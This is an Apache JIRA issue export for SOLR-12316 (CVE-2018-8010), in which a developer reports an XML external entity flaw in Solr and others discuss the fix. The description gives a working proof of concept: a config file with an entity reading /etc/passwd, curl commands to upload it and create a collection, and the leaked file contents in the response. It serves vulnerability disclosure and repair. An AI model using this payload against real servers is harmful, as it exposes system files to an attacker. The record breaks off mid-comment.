<!-- 
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Wed Nov 12 04:32:42 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<rss version="0.92" >
<channel>
    <title>ASF JIRA</title>
    <link>https://issues.apache.org/jira</link>
    <description>This file is an XML representation of an issue</description>
    <language>en-uk</language>    <build-info>
        <version>8.20.10</version>
        <build-number>820010</build-number>
        <build-date>22-06-2022</build-date>
    </build-info>


<item>
            <title>[SOLR-12316] CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)</title>
                <link>https://issues.apache.org/jira/browse/SOLR-12316</link>
                <project id="12310230" key="SOLR">Solr</project>
                    <description>&lt;p&gt;While trying to work around the issue of being unable to upload large files to ZK (without jute.maxbuffer setting), &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=antz&quot; class=&quot;user-hover&quot; rel=&quot;antz&quot;&gt;antz&lt;/a&gt; brought to my notice that he was able to successfully achieve that using XXE. That alarmed me! Our managed-schema and solrconfig.xml parse XXEs!&lt;/p&gt;

&lt;p&gt;Here&apos;s a very nasty attack I could execute using this and configset upload functionality:&lt;/p&gt;

&lt;p&gt;Step 1: Create a configset with just two files in a directory called &quot;minimal&quot;:&lt;/p&gt;

&lt;p&gt;schema.xml:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&amp;lt;schema name=&lt;span class=&quot;code-quote&quot;&gt;&quot;minimal&quot;&lt;/span&gt; version=&lt;span class=&quot;code-quote&quot;&gt;&quot;1.1&quot;&lt;/span&gt;&amp;gt;
  &amp;lt;fieldType name=&lt;span class=&quot;code-quote&quot;&gt;&quot;string&quot;&lt;/span&gt; class=&lt;span class=&quot;code-quote&quot;&gt;&quot;solr.StrField&quot;&lt;/span&gt;/&amp;gt;
  &amp;lt;dynamicField name=&lt;span class=&quot;code-quote&quot;&gt;&quot;*&quot;&lt;/span&gt; type=&lt;span class=&quot;code-quote&quot;&gt;&quot;string&quot;&lt;/span&gt; indexed=&lt;span class=&quot;code-quote&quot;&gt;&quot;&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;&quot;&lt;/span&gt; stored=&lt;span class=&quot;code-quote&quot;&gt;&quot;&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;&quot;&lt;/span&gt;/&amp;gt;
&amp;lt;/schema&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;solrconfig.xml&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&amp;lt;?xml version=&lt;span class=&quot;code-quote&quot;&gt;&quot;1.0&quot;&lt;/span&gt; ?&amp;gt;

&amp;lt;!DOCTYPE doc [
&amp;lt;!ENTITY passwdFile SYSTEM &lt;span class=&quot;code-quote&quot;&gt;&quot;file:&lt;span class=&quot;code-comment&quot;&gt;///etc/passwd&quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;]&amp;gt;
&amp;lt;config&amp;gt;
  &amp;lt;dataDir&amp;gt;${solr.data.dir:}&amp;lt;/dataDir&amp;gt;
  &amp;lt;directoryFactory name=&lt;span class=&quot;code-quote&quot;&gt;&quot;DirectoryFactory&quot;&lt;/span&gt;
                    class=&lt;span class=&quot;code-quote&quot;&gt;&quot;${solr.directoryFactory:solr.NRTCachingDirectoryFactory}&quot;&lt;/span&gt;/&amp;gt;
  &amp;lt;schemaFactory class=&lt;span class=&quot;code-quote&quot;&gt;&quot;ClassicIndexSchemaFactory&quot;&lt;/span&gt;/&amp;gt;

  &amp;lt;luceneMatchVersion&amp;gt;7.3.0&amp;lt;/luceneMatchVersion&amp;gt;
  &amp;lt;updateHandler class=&lt;span class=&quot;code-quote&quot;&gt;&quot;solr.DirectUpdateHandler2&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;commitWithin&amp;gt;
      &amp;lt;softCommit&amp;gt;${solr.commitwithin.softcommit:&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;}&amp;lt;/softCommit&amp;gt;
    &amp;lt;/commitWithin&amp;gt;
  &amp;lt;/updateHandler&amp;gt;
  &amp;lt;requestHandler name=&lt;span class=&quot;code-quote&quot;&gt;&quot;/select&quot;&lt;/span&gt; class=&lt;span class=&quot;code-quote&quot;&gt;&quot;solr.SearchHandler&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;lst name=&lt;span class=&quot;code-quote&quot;&gt;&quot;defaults&quot;&lt;/span&gt;&amp;gt;
      &amp;lt;str name=&lt;span class=&quot;code-quote&quot;&gt;&quot;echoParams&quot;&lt;/span&gt;&amp;gt;explicit&amp;lt;/str&amp;gt;
      &amp;lt;str name=&lt;span class=&quot;code-quote&quot;&gt;&quot;indent&quot;&lt;/span&gt;&amp;gt;&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;&amp;lt;/str&amp;gt;
      &amp;lt;str name=&lt;span class=&quot;code-quote&quot;&gt;&quot;df&quot;&lt;/span&gt;&amp;gt;text&amp;lt;/str&amp;gt;
      &amp;lt;str name=&lt;span class=&quot;code-quote&quot;&gt;&quot;password&quot;&lt;/span&gt;&amp;gt;&amp;amp;passwdFile;&amp;lt;/str&amp;gt;
    &amp;lt;/lst&amp;gt;
  &amp;lt;/requestHandler&amp;gt;
&amp;lt;/config&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step 2: Upload the minimal directory to Solr using configset upload API:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[ishan@x260 solr] $ (cd minimal &amp;amp;&amp;amp; zip -r - *) | curl -X POST --header &lt;span class=&quot;code-quote&quot;&gt;&quot;Content-Type:application/octet-stream&quot;&lt;/span&gt; --data-binary @- &lt;span class=&quot;code-quote&quot;&gt;&quot;http:&lt;span class=&quot;code-comment&quot;&gt;//localhost:8983/solr/admin/configs?action=UPLOAD&amp;amp;name=mybadconfigset&quot;&lt;/span&gt;
&lt;/span&gt;  adding: schema.xml (deflated 42%)
  adding: solrconfig.xml (deflated 50%)
{
  &lt;span class=&quot;code-quote&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:{
    &lt;span class=&quot;code-quote&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
    &lt;span class=&quot;code-quote&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:23}}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step 3: Create a collection using this configset&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[ishan@x260 solr] $ curl &lt;span class=&quot;code-quote&quot;&gt;&quot;http:&lt;span class=&quot;code-comment&quot;&gt;//localhost:8983/solr/admin/collections?action=CREATE&amp;amp;name=mybadcoll&amp;amp;numShards=1&amp;amp;collection.configName=mybadconfigset&quot;&lt;/span&gt;
&lt;/span&gt;{
  &lt;span class=&quot;code-quote&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:{
    &lt;span class=&quot;code-quote&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
    &lt;span class=&quot;code-quote&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:3431},
  &lt;span class=&quot;code-quote&quot;&gt;&quot;success&quot;&lt;/span&gt;:{
    &lt;span class=&quot;code-quote&quot;&gt;&quot;192.168.1.6:8983_solr&quot;&lt;/span&gt;:{
      &lt;span class=&quot;code-quote&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:{
        &lt;span class=&quot;code-quote&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:2062},
      &lt;span class=&quot;code-quote&quot;&gt;&quot;core&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;mybadcoll_shard1_replica_n1&quot;&lt;/span&gt;}}}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step 4: Use Config API to check the select handler&apos;s config. The file is revealed!&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[ishan@x260 solr] $ curl &lt;span class=&quot;code-quote&quot;&gt;&quot;http:&lt;span class=&quot;code-comment&quot;&gt;//localhost:8983/solr/mybadcoll/config/requestHandler&quot;&lt;/span&gt;|jq
&lt;/span&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7939  100  7939    0     0   7939      0  0:00:01 --:--:--  0:00:01  323k
{
  &lt;span class=&quot;code-quote&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;: {
    &lt;span class=&quot;code-quote&quot;&gt;&quot;status&quot;&lt;/span&gt;: 0,
    &lt;span class=&quot;code-quote&quot;&gt;&quot;QTime&quot;&lt;/span&gt;: 16
  },
  &lt;span class=&quot;code-quote&quot;&gt;&quot;config&quot;&lt;/span&gt;: {
    &lt;span class=&quot;code-quote&quot;&gt;&quot;requestHandler&quot;&lt;/span&gt;: {
      &lt;span class=&quot;code-quote&quot;&gt;&quot;/select&quot;&lt;/span&gt;: {
        &lt;span class=&quot;code-quote&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;/select&quot;&lt;/span&gt;,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;class&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;solr.SearchHandler&quot;&lt;/span&gt;,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;defaults&quot;&lt;/span&gt;: {
          &lt;span class=&quot;code-quote&quot;&gt;&quot;echoParams&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;explicit&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;indent&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;df&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;text&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/adm:/sbin/nologin\nlp:x:4:7:lp:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/spool/mail:/sbin/nologin\noperator:x:11:0:&lt;span class=&quot;code-keyword&quot;&gt;operator&lt;/span&gt;:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\nsystemd-timesync:x:999:998:systemd Time Synchronization:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\ndbus:x:81:81:&lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt; message bus:/:/sbin/nologin\npolkitd:x:998:997:User &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; polkitd:/:/sbin/nologin\ngeoclue:x:997:996:User &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; geoclue:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/geoclue:/sbin/nologin\nrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\npulse:x:171:171:PulseAudio &lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt; Daemon:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/run/pulse:/sbin/nologin\navahi:x:70:70:Avahi mDNS/DNS-SD Stack:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/run/avahi-daemon:/sbin/nologin\nchrony:x:996:992::/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/chrony:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/rpcbind:/sbin/nologin\nusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin\nradvd:x:75:75:radvd user:/:/sbin/nologin\nqemu:x:107:107:qemu user:/:/sbin/nologin\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\ncolord:x:995:990:User &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; colord:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/colord:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsaslauth:x:994:76:Saslauthd user:/run/saslauthd:/sbin/nologin\nopenvpn:x:993:988:OpenVPN:/etc/openvpn:/sbin/nologin\nnm-openvpn:x:992:987:Default user &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; running openvpn spawned by NetworkManager:/:/sbin/nologin\ngdm:x:42:42::/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/gdm:/sbin/nologin\nsetroubleshoot:x:991:985::/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/setroubleshoot:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/nfs:/sbin/nologin\nnm-openconnect:x:990:984:NetworkManager user &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; OpenConnect:/:/sbin/nologin\ngnome-initial-setup:x:989:983::/run/gnome-initial-setup/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/empty/sshd:/sbin/nologin\ntss:x:59:59:Account used by the trousers &lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt; to sandbox the tcsd daemon:/dev/&lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt;:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nishan:x:1000:1000:Ishan Chattopadhyaya:/home/ishan:/bin/bash\nsystemd-coredump:x:982:982:systemd Core Dumper:/:/sbin/nologin\nakmods:x:981:981:User is used by akmods to build akmod packages:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/cache/akmods/:/sbin/nologin\nkube:x:980:978:Kubernetes user:/:/sbin/nologin\nzookeeper:x:979:977:ZooKeeper service account:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/zookeeper:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\nautossh:x:977:975:autossh service account:/etc/autossh:/usr/sbin/nologin\nnginx:x:976:974:Nginx web server:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/nginx:/sbin/nologin\ngluster:x:975:972:GlusterFS daemons:/run/gluster:/sbin/nologin\npipewire:x:974:971:PipeWire &lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt; Daemon:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/run/pipewire:/sbin/nologin\nunbound:x:973:970:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nnetdata:x:972:969:NetData User:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/netdata:/sbin/nologin\ndnsmasq:x:967:967:Dnsmasq DHCP and DNS server:/&lt;span class=&quot;code-keyword&quot;&gt;var&lt;/span&gt;/lib/dnsmasq:/sbin/nologin\n&quot;&lt;/span&gt;
        }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13157398">SOLR-12316</key>
            <summary>CVE-2018-8010: Prevent XXE in solrconfig.xml and managed-schema(.xml)</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="uschindler">Uwe Schindler</assignee>
                                    <reporter username="ichattopadhyaya">Ishan Chattopadhyaya</reporter>
                        <labels>
                            <label>security</label>
                    </labels>
                <created>Sun, 6 May 2018 06:40:31 +0000</created>
                <updated>Sat, 8 Jun 2019 14:47:50 +0000</updated>
                            <resolved>Tue, 15 May 2018 03:18:33 +0000</resolved>
                                    <version>5.5.5</version>
                    <version>6.6.3</version>
                    <version>7.3</version>
                                    <fixVersion>6.6.4</fixVersion>
                    <fixVersion>7.3.1</fixVersion>
                    <fixVersion>7.4</fixVersion>
                    <fixVersion>8.0</fixVersion>
                                    <component>config-api</component>
                    <component>Schema and Analysis</component>
                    <component>Server</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>6</watches>
                                                                                                                <comments>
                            <comment id="16465016" author="ichattopadhyaya" created="Sun, 6 May 2018 08:21:16 +0000"  >&lt;p&gt;Here&apos;s a patch that disables the external entity resolution. I&apos;m running tests at the moment. Someone please review.&lt;/p&gt;

&lt;p&gt;I see several different places where an unsecure DocumentBuilderFactory is being used. I&apos;ll review their usage shortly.&lt;/p&gt;</comment>
                            <comment id="16465017" author="thetaphi" created="Sun, 6 May 2018 08:29:14 +0000"  >&lt;p&gt;Please wait a minute, this would break lots of people. External entities are allowed for a good reason, but they should not escape - the entity resolve set afterwards should do this. PLEASE DO NOT OVERREACT:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Hi Ishan, that&#8217;s wanted and also documented!&lt;/p&gt;

&lt;p&gt;Solrconfig and solrschema are also parsed with enabled &#8220;xinclude&#8221;, so you have 2 possiblities to read external files. So it&#8217;s made for allowing the users to split their config files into multiple ones. You should not allow to escape the Solr folder, because the whole entity resolving and xinclude is limited to SolrResourceLoader (see &lt;a href=&quot;https://goo.gl/nyJ8J6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://goo.gl/nyJ8J6&lt;/a&gt; in combination with &lt;a href=&quot;https://goo.gl/s4pcBZ):&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://goo.gl/s4pcBZ):&lt;/a&gt; You should not be able to escape Solr&#8217;s home directory. The Entity Resolver used there can optionally not allow this (there is a test). We may enable the &#8220;feature&#8221; to restrict to home dir. Ishan could it be that you have enabled: &#8220;-Dsolr.allow.unsafe.resourceloading=true&#8221; ?&lt;/p&gt;

&lt;p&gt;I have many people that use conventional schema.xml and solrconfig.xml files that are split intro multiple files, so we have to keep&lt;/p&gt;

&lt;p&gt;IMHO: It could only be broken now, because the above check in SolrResourceLoader is no longer working correctly because of some zookeeper changes. Theoretically you should only be able to load files using SolrResourceLoader from the same directory/zookeeper node that solr has as &#8220;root&#8221;.&lt;/p&gt;

&lt;p&gt;So the issue seems there, but may also be a config problem.&lt;/p&gt;

&lt;p&gt;Can you give your log file when booting up solr?&lt;/p&gt;

&lt;p&gt;Uwe&lt;/p&gt;&lt;/blockquote&gt;</comment>
                            <comment id="16465018" author="thetaphi" created="Sun, 6 May 2018 08:31:09 +0000"  >&lt;p&gt;We should only check, why (maybe because of some recent zookeper changes), this does not work anymore:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/lucene-solr/blob/e2521b2a8baabdaf43b92192588f51e042d21e97/solr/core/src/java/org/apache/solr/core/SolrResourceLoader.java#L364-L372&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/lucene-solr/blob/e2521b2a8baabdaf43b92192588f51e042d21e97/solr/core/src/java/org/apache/solr/core/SolrResourceLoader.java#L364-L372&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="16465022" author="thetaphi" created="Sun, 6 May 2018 08:34:20 +0000"  >&lt;p&gt;Ishan, also the above patch does not fix external entities, we have a single place in code to make a XML parser safe, let&apos;s only use this. Don&apos;t start and add different variant of code that does similar stuff, that could be centralized. I also see that you have not read the whole code, the SystemIdResolver is still there in your code. To disable external stuff completely you have to use &quot;EmptyEntityResolver&quot;. The parser attributes/properties you try to set are likely to break depending on your JVM - don&apos;t do it like that!&lt;/p&gt;</comment>
                            <comment id="16465023" author="thetaphi" created="Sun, 6 May 2018 08:36:58 +0000"  >&lt;p&gt;Can you check if you go this warning?:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/apache/lucene-solr/blob/e2521b2a8baabdaf43b92192588f51e042d21e97/solr/core/src/java/org/apache/solr/util/SystemIdResolver.java#L154&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/lucene-solr/blob/e2521b2a8baabdaf43b92192588f51e042d21e97/solr/core/src/java/org/apache/solr/util/SystemIdResolver.java#L154&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;While loading the config? If yes we should make this an exception. I have the feeling that this causes the problem, if the warning is seen.&lt;/p&gt;</comment>
                            <comment id="16465025" author="ichattopadhyaya" created="Sun, 6 May 2018 08:43:59 +0000"  >
&lt;blockquote&gt;&lt;p&gt;Please wait a minute, this would break lots of people. External entities are allowed for a good reason&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Thanks for bringing it up; I wasn&apos;t aware that this was explicitly supported, as I couldn&apos;t see any tests for this.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;I see several different places where an unsecure DocumentBuilderFactory is being used. I&apos;ll review their usage shortly.&lt;/p&gt;&lt;/blockquote&gt;

&lt;blockquote&gt;&lt;p&gt;Don&apos;t start and add different variant of code that does similar stuff, that could be centralized.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Indeed, Uwe, I plan to centralize this safe creation of DocumentBuilder (and possibly forbid creation from elsewhere, if that&apos;s possible).&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Ishan, also the above patch does not fix external entities, we have a single place in code to make a XML parser safe, let&apos;s only use this.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Sure! I was just following guidance from &lt;a href=&quot;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#JAXP_DocumentBuilderFactory.2C_SAXParserFactory_and_DOM4J&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#JAXP_DocumentBuilderFactory.2C_SAXParserFactory_and_DOM4J&lt;/a&gt; and checking if it can prevent this attack (which it did). I&apos;ll follow your advice and cook up another patch shortly.&lt;/p&gt;</comment>
                            <comment id="16465027" author="ichattopadhyaya" created="Sun, 6 May 2018 08:53:07 +0000"  >&lt;blockquote&gt;&lt;p&gt;Can you check if you go this warning?:&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I don&apos;t see that line in my logs (attached). I&apos;m using (unpatched) master.&lt;/p&gt;</comment>
                            <comment id="16465038" author="thetaphi" created="Sun, 6 May 2018 09:20:29 +0000"  >&lt;p&gt;You don&apos;t need to centralize, it&apos;s already there. To disable external entities, don&apos;t set those properties. It is highly parser dependent and break with some JVMs. The correct &quot;Solr&quot; way is to simply set &quot;EmptyEntityResolver&quot; (see a few lines below in your path where the SystemIdEntityResolver using SolrResourceLoader is set), which is already part of the distribution. And that should already be done at all other places loading XML files (e.g., when loading documents with update handler), so your code analysis was not complete. Those properties with apache names are the &quot;shotgun aproach&quot;, but may fail horribly and you cannot parse XML at all. Setting another entity resolver is easy and done everywhere. The OWASP stuff is such a &quot;shotgun approach&quot;, but requires that you use exactly the libraries they expect (Apache XERCES). So better do the way using the public apis instead of setting abstruse properties.&lt;/p&gt;

&lt;p&gt;The problem here may be changes in SolrResourceLoader. I will check this, because it will also affect your &quot;home made include aproach&quot;!&lt;/p&gt;

&lt;p&gt;Every other utility we may invent to include other files always has the same problem, so there is no need to find another one. SolrResourceLoader should just be strict and enforce that any resource loaded comes from below the Solr home dir. That&apos;s the same you have to do for your home-grown approach which is not even standard compliant.&lt;/p&gt;

&lt;p&gt;I just repeat: The correct way to fix all issues we have seen the last time is very simple: LET&apos;S RUN SOLR INSIDE A SECURITY MANAGER IN PRODUCTION (like in tests). Elasticsearch is doing this, so please please let&apos;s do this instead. But this requires to finally get rid of the webapplication and start.jar and add our own bootstrapping (like in tests) that configure Jetty and Security Manager from our own org.apache.solr.bootstrap.Main.java (or similar).&lt;/p&gt;</comment>
                            <comment id="16465049" author="thetaphi" created="Sun, 6 May 2018 09:27:51 +0000"  >&lt;p&gt;I will just make the SystemIdEntityResolver more strict and disable any absolute paths and let&apos;s also remove the system property to circumvent.&lt;/p&gt;</comment>
                            <comment id="16465050" author="thetaphi" created="Sun, 6 May 2018 09:28:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ichattopadhyaya&quot; class=&quot;user-hover&quot; rel=&quot;ichattopadhyaya&quot;&gt;ichattopadhyaya&lt;/a&gt;: I will check your setup and reproduce this and then make it strict.&lt;/p&gt;</comment>
                            <comment id="16465054" author="ichattopadhyaya" created="Sun, 6 May 2018 09:51:34 +0000"  >&lt;blockquote&gt;&lt;p&gt;&quot;home made include aproach&quot;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Are you referring to the following?&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&amp;lt;!DOCTYPE doc [
&amp;lt;!ENTITY passwdFile SYSTEM &lt;span class=&quot;code-quote&quot;&gt;&quot;file:&lt;span class=&quot;code-comment&quot;&gt;///etc/passwd&quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;]&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;&lt;p&gt;You don&apos;t need to centralize, it&apos;s already there. To disable external entities, don&apos;t set those properties. It is highly parser dependent and break with some JVMs. The correct &quot;Solr&quot; way is to simply set &quot;EmptyEntityResolver&quot; (see a few lines below in your path where the SystemIdEntityResolver using SolrResourceLoader is set), which is already part of the distribution. And that should already be done at all other places loading XML files (e.g., when loading documents with update handler), so your code analysis was not complete. Those properties with apache names are the &quot;shotgun aproach&quot;, but may fail horribly and you cannot parse XML at all. Setting another entity resolver is easy and done everywhere. The OWASP stuff is such a &quot;shotgun approach&quot;, but requires that you use exactly the libraries they expect (Apache XERCES). So better do the way using the public apis instead of setting abstruse properties.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Simply setting the entity resolver to EmptyEntityResolver.SAX_INSTANCE resulted in tons of test failures (perhaps all tests failed) &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;. As you mentioned, fixing SolrResourceLoader to not allow loading resources from outside the home directory makes sense.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Ishan Chattopadhyaya: I will check your setup and reproduce this and then make it strict.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thetaphi&quot; class=&quot;user-hover&quot; rel=&quot;thetaphi&quot;&gt;thetaphi&lt;/a&gt; &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt; I&apos;m glad that an expert on this is here!&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; - &lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
